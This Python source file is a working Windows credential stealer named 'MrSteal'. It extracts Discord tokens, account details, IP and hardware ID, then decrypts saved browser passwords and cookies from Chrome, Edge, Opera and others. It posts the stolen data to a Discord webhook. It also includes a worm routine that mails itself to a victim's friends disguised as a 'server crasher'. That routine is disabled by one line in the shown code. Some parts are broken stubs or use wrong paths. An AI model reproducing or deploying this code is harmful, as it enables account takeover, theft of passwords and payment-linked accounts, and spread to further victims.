import os
if os.name != "nt":
    exit()
from re import findall
from json import loads, dumps
from base64 import b64decode
from datetime import datetime
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from threading import Thread
from time import sleep
from sys import argv
import win32crypt
from sqlite3 import connect
from Cryptodome.Cipher import AES
from shutil import copy2
from requests import post, get
dt = datetime.now()


webhookurl = ""     #computer
WEBHOOK_URL = ''    #discord


LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    "Discord"           : ROAMING + "\\Discord",
    "Discord Canary"    : ROAMING + "\\discordcanary",
    "Discord PTB"       : ROAMING + "\\discordptb",
    "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
    "Firefox"           : LOCAL + "\\Mozilla\\Firefox\\User Data\\Profiles",
    "Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
    "Edge"              : LOCAL + "\\\Microsoft\\Edge\\User Data\\Default",
    "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default",
    "Vivaldi"           : LOCAL + "\\Vivaldi\\User Data\\User Data",
    "OperaGX"           : LOCAL + "\\Opera Software\\Opera GX Stable",

}
def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers
def getuserdata(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
    except:
        pass
def gettokens(path):
    path += "\\Local Storage\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens
def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip
def getavatar(uid, aid):
    url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
    try:
        urlopen(Request(url))
    except:
        url = url[:-4]
    return url
def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
def getfriends(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships", headers=getheaders(token))).read().decode())
    except:
        pass
def getchat(token, uid):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getheaders(token), data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
    except:
        pass
def has_payment_methods(token):
    try:
        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
    except:
        pass
def send_message(token, chat_id, form_data):
    try:
        urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getheaders(token, "multipart/form-data; boundary=---------------------------325414537030329320151394843687"), data=form_data.encode())).read().decode()
    except:
        pass
def spread(token, form_data, delay):
    return # Remove to re-enabled
    for friend in getfriends(token):
        try:
            chat_id = getchat(token, friend["id"])
            send_message(token, chat_id, form_data)
        except Exception as e:
            pass
        sleep(delay)
def main():     #stealing data
    cache_path = ROAMING + "\\.cache~$"
    prevent_spam = True
    self_spread = True
    embeds = []
    working = []
    checked = []
    already_cached_tokens = []
    working_ids = []
    ip = getip()
    pc_username = os.getenv("UserName")
    pc_name = os.getenv("COMPUTERNAME")
    user_path_name = os.getenv("userprofile").split("\\")[2]
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in gettokens(path):
            if token in checked:
                continue
            checked.append(token)
            uid = None
            if not token.startswith("mfa."):
                try:
                    uid = b64decode(token.split(".")[0].encode()).decode()
                except:
                    pass
                if not uid or uid in working_ids:
                    continue
            user_data = getuserdata(token)
            if not user_data:
                continue
            working_ids.append(uid)
            working.append(token)
            username = user_data["username"] + "#" + str(user_data["discriminator"])
            user_id = user_data["id"]
            avatar_id = user_data["avatar"]
            avatar_url = getavatar(user_id, avatar_id)
            email = user_data.get("email")
            phone = user_data.get("phone")
            nitro = bool(user_data.get("premium_type"))
            flags = user_data.get("public_flags")
            
            billing = bool(has_payment_methods(token))
            embed = {
                "color": 0x5865f2,
                "fields": [
                    {
                        "name": "**Account Info**",
                        "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
                        "inline": True
                    },
                    {
                        "name": "**PC Info**",
                        "value": f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}',
                        "inline": True
                    },
                    {
                        "name": "**Token**",
                        "value": token,
                        "inline": False
                    },
                ],
                "author": {
                    "name": f"{username} ({user_id})",
                    "icon_url": avatar_url
                },
                "footer": {
                    "text": "Hooked at • " + dt.strftime('%Y-%m-%d %H:%M:%S'),
                }
            }

            embeds.append(embed)
    with open(cache_path, "a") as file:
        for token in checked:
            if not token in already_cached_tokens:
                file.write(token + "\n")
    if len(working) == 0:
        working.append('123')
    webhook = {
        "content": "",
        "embeds": embeds,
        "username": "MrSteal",
        "avatar_url": "https://i.hizliresim.com/9ftjid9.jpg"
    }
    try:
        urlopen(Request(WEBHOOK_URL, data=dumps(webhook).encode(), headers=getheaders()))
    except:
        pass
    if self_spread:
        for token in working:
            with open(argv[0], encoding="utf-8") as file:
                content = file.read()
            payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="file"; filename="{__file__}"\nContent-Type: text/plain\n\n{content}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\nserver crasher. python download: https://www.python.org/downloads\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="tts"\n\nfalse\n-----------------------------325414537030329320151394843687--'
            Thread(target=spread, args=(token, payload, 7500 / 1000)).start()
try:
    main()
except:
    exit(1)
fileCookies = "cooks_"+ os.getlogin()+ ".txt"
filePass = "passes_"+ os.getlogin()+ ".txt"
fileInfo = "info_" + os.getlogin()+ ".txt"

#DISCORD TOKENS
def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in findall(regex, line):
                    tokens.append(token)
    f = open(fileInfo, "a")
    f.write(str(tokens))
    f.write("\n")
    f.close()

#DECRYPT CIPHERS
def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

#DECRYPT BROWSER
def decrypt_browser(LocalState, LoginData, CookiesFile, name):
    

    if os.path.exists(LocalState) == True:
        with open(LocalState) as f:
            local_state = f.read()
            local_state = loads(local_state)
        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]

        if os.path.exists(LoginData) == True:
            copy2(LoginData, "TempMan.db")
            con = connect("TempMan.db")
            cur = con.cursor()
            cur.execute("SELECT origin_url, username_value, password_value FROM logins")
            f = open(filePass,"a")
            f.write("***" + name + "***\n")
            f.close()
            for index,logins in enumerate(cur.fetchall()):

                try:
                    if not logins[0]:
                        continue
                    if not logins[1]:
                        continue
                    if not logins[2]:
                        continue
                    ciphers = logins[2]
                    initVector = ciphers[3:15]
                    encPass = ciphers[15:-16]

                    cipher = generate_cipher(master_key, initVector)
                    decPass = decrypt_payload(cipher, encPass).decode()
                    toprint = 'URL : {}\nName: {}\nPass: {}\n\n'.format(logins[0], logins[1], decPass)
                    f = open(filePass,"a")
                    f.write(toprint)
                    f.close()
                except:
                    pass
            

            
        else:
            f = open(fileInfo,"a")
            f.write(name + " Login Data file missing\n")
            f.close()
######################################################################
        if os.path.exists(CookiesFile) == True:
            copy2(CookiesFile, "CookMe.db")
            conn = connect("CookMe.db")
            curr = conn.cursor()
            curr.execute("SELECT host_key, name, encrypted_value, expires_utc FROM cookies")
            f = open(fileCookies,"a")
            f.write("***" + name + "***\n")
            f.close()
            for index, cookies in enumerate(curr.fetchall()):

                try:
                    if not cookies[0]:
                        continue
                    if not cookies[1]:
                        continue
                    if not cookies[2]:
                        continue
                    if "google" in cookies[0]:
                        continue
                    ciphers = cookies[2]
                    initVector = ciphers[3:15]
                    encPass = ciphers[15:-16]
                    cipher = generate_cipher(master_key, initVector)
                    decPass = decrypt_payload(cipher, encPass).decode()
                    toprint = 'URL : {}\nName: {}\nCook: {}\n\n'.format(cookies[0], cookies[1], decPass)
                    l = open(fileCookies,"a")
                    l.write(toprint)
                    l.close()
                except:
                    pass


        else:
            f = open(fileInfo,"a")
            f.write("no " + name + " Cookie file\n")
            f.close()


    else:
        f = open(fileInfo,"a")
        f.write(name + " Local State file missing\n")
        f.close()

#PATH SHIT
def Local_State(path):
    LocalState = path + "\\User Data\\Local State"
    return LocalState

def Login_Data(path):
    LoginData = path + "\\User Data\\Default\\Login Data"
    return LoginData

def Cookies(path):
    Cookies = path + "\\User Data\\Default\\Network\\Cookies"
    return Cookies

if os.path.exists(os.environ['APPDATA'] + "\\Discord") == True:
    find_tokens(os.environ['APPDATA'] + "\\Discord")
if os.path.exists(os.environ['APPDATA'] + "\\discordptb") == True:
    find_tokens(os.environ['APPDATA'] + "\\discordptb")
if os.path.exists(os.environ['APPDATA'] + "\\discordcanary") == True:
    find_tokens(os.environ['APPDATA'] + "\\discordcanary")



#CHROME
pathChrome = os.environ['LOCALAPPDATA'] + "\\Google\\Chrome"

if os.path.exists(pathChrome) == True:
    decrypt_browser(Local_State(pathChrome), Login_Data(pathChrome), Cookies(pathChrome), "Chrome") 
else:
    f = open(fileInfo,"a")
    f.write("Chrome is not installed\n")
    f.close()



#EDGE
pathEdge = os.environ['LOCALAPPDATA'] + "\\Microsoft\\Edge"

if os.path.exists(pathEdge) == True:
    decrypt_browser(Local_State(pathEdge), Login_Data(pathEdge), Cookies(pathEdge), "Edge") 
else:
    f = open(fileInfo,"a")
    f.write("Edge is not installed\n")
    f.close()



#OPERA
pathOpera = os.environ['APPDATA'] + "\\Opera Software\\Opera Stable"

if os.path.exists(pathOpera) == True:
    decrypt_browser(pathOpera + "\\Local State", pathOpera + "\\Login Data", pathOpera + "\\Network\\Cookies", "Opera") 
else:
    f = open(fileInfo,"a")
    f.write("Opera is not installed\n")
    f.close()



#OPERAGX
pathOperaGX = os.environ['APPDATA'] + "\\Opera Software\\Opera GX Stable"

if os.path.exists(pathOperaGX) == True:
    decrypt_browser(pathOperaGX + "\\Local State", pathOperaGX + "\\Login Data", pathOperaGX + "\\Cookies", "OperaGX") 
else:
    f = open(fileInfo,"a")
    f.write("OperaGX is not installed\n")
    f.close()


#Firefox
pathFirefox = os.environ['LOCAL'] + "\\Mozilla\\Firefox\\User Data\\Profiles"

if os.path.exists(pathFirefox) == True:
    decrypt_browser(pathFirefox + "\\Local State", pathFirefox + "\\Login Data", pathFirefox + "\\Cookies", "Firefox") 
else:
    f = open(fileInfo,"a")
    f.write("Firefox is not installed\n")
    f.close()



#Vivaldi
pathVivaldi = os.environ['LOCAL'] + "\\Vivaldi\\User Data\\User Data"

if os.path.exists(pathVivaldi) == True:
    decrypt_browser(pathVivaldi + "\\Local State", pathVivaldi + "\\Login Data", pathVivaldi + "\\Cookies", "Vivaldi") 
else:
    f = open(fileInfo,"a")
    f.write("Vivaldi is not installed\n")
    f.close()




#Yandex
pathYandex = os.environ['LOCAL'] + "\\Yandex\\YandexBrowser\\User Data\\Default"

if os.path.exists(pathYandex) == True:
    decrypt_browser(pathYandex + "\\Local State", pathYandex + "\\Login Data", pathYandex + "\\Cookies", "Yandex") 
else:
    f = open(fileInfo,"a")
    f.write("Yandex is not installed\n")
    f.close()



###WEBHOOK

def post_to(file):
    token = ""
    chatid = ""
    webhookurl

if os.path.exists(fileInfo) == True:
    post_to(fileInfo)
    
if os.path.exists(filePass) == True:
    post_to(filePass)
    
if os.path.exists(fileCookies) == True:
    post_to(fileCookies)
###


if os.path.exists(fileInfo) == True:
    os.remove(fileInfo)
if os.path.exists(filePass) == True:
    os.remove(filePass)
if os.path.exists(fileCookies) == True:
    os.remove(fileCookies)

os.remove("TempMan.db")
os.remove("CookMe.db")